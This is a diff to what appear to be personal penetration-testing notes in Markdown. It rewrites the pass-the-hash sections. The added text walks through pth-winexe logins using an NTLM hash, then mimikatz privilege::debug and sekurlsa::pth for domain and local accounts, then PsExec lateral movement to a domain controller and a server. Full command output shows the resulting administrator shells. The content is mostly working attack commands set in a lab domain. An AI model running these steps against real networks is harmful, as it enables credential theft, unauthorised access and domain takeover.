@@ -259,23 +259,6 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 ☝️ **Note**: LM hashes are not used from Windows 10 onwards, string of 32 zeros can used to fill the LM hash portion of the pth-winexe command
 
 ## pth-winexe
-- Local account
-```console
-┌──(kali㉿kali)-[~]
-└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
-E_md4hash wrapper called.
-HASH PASS: Substituting user supplied NTLM HASH...
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-whoami
-svr\administrator
-
-C:\Windows\system32>hostname
-hostname
-SVR
-```
 - Domain account
 ```console
 ┌──(kali㉿kali)-[~]
@@ -293,14 +276,127 @@ C:\Windows\system32>hostname
 hostname
 SVR
 ```
-## mimikatz - sekurlsa::pth
 - Local account
 ```console
-sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
+┌──(kali㉿kali)-[~]
+└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+svr\administrator
+
+C:\Windows\system32>hostname
+hostname
+SVR
 ```
-- Domain account
+## mimikatz - sekurlsa::pth
+### Domain account
+- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
+- The `sekurlsa::pth` will spawn a new cmd window
 ```console
-sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:powershell.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
+user    : domainadmin
+domain  : lab.vx
+program : cmd.exe
+impers. : no
+NTLM    : e19ccf75ee54e06b06a5907af13cef42
+  |  PID  2536
+  |  TID  7400
+  |  LSA Process is now R/W
+  |  LUID 0 ; 10105231 (00000000:009a318f)
+  \_ msv1_0   - data copy @ 00000129DC857510 : OK !
+  \_ kerberos - data copy @ 00000129DC9DA8C8
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 00000129DC9D00E8 (32) -> null
+```
+- Connect to the target machine in the new cmd window
+```console
+C:\Windows\system32>whoami
+lab\mike
+
+C:\Windows\system32>hostname
+CLIENT
+
+C:\Windows\system32>psexec \\dc cmd.exe
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+lab\domainadmin
+
+C:\Windows\system32>hostname
+DC
+```
+### Local account
+- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
+```console
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
+user    : administrator
+domain  : *
+program : cmd.exe
+impers. : no
+NTLM    : e19ccf75ee54e06b06a5907af13cef42
+  |  PID  6872
+  |  TID  5672
+  |  LSA Process was already R/W
+  |  LUID 0 ; 13220694 (00000000:00c9bb56)
+  \_ msv1_0   - data copy @ 00000129DC9C5AB0 : OK !
+  \_ kerberos - data copy @ 00000129DC9D8288
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 00000129DBEE4128 (32) -> null
+```
+- Connect to the target machine in the new cmd window
+- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd
+```console
+C:\Windows\system32>whoami
+lab\mike
+
+C:\Windows\system32>hostname
+CLIENT
+
+C:\Windows\system32>psexec \\svr cmd.exe
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+svr\administrator
+
+C:\Windows\system32>hostname
+SVR
 ```
 
 # Silver Ticket
